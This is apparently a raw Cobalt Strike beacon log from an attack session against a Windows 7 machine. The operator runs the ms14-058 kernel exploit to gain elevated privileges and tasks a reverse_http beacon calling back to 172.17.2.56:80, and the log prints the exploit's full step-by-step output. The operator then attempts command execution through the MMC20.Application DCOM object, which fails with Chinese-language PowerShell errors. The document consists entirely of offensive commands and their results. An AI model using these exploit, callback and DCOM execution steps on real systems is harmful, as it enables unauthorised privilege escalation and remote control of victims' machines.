02/02 13:47:11 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 1500; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/02 13:47:20 [input] <neo> elevate ms14-058 test
02/02 13:47:20 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/02 13:48:03 [checkin] host called home, sent: 104503 bytes
02/02 13:48:05 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c14000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F671FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6A9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C114F8E0
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/02 14:04:36 [task] Tasked beacon to run: sc start DcomLaunch
02/02 14:04:36 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"))
02/02 14:04:36 [task] Tasked beacon to run: $Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 14:05:05 [checkin] host called home, sent: 680 bytes
02/02 14:05:07 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 14:05:07 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">不能对值为空的表达式调用方法。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 45_x000D__x000A_</S><S S="Error">+ $Com.Document.ActiveView.ExecuteShellCommand &lt;&lt;&lt;&lt; ("c:\windows\system32\calc._x000D__x000A_</S><S S="Error">exe", $null, $null, "7")_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (ExecuteShellCommand:String) [ _x000D__x000A_</S><S S="Error">   ], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : InvokeMethodOnNull_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

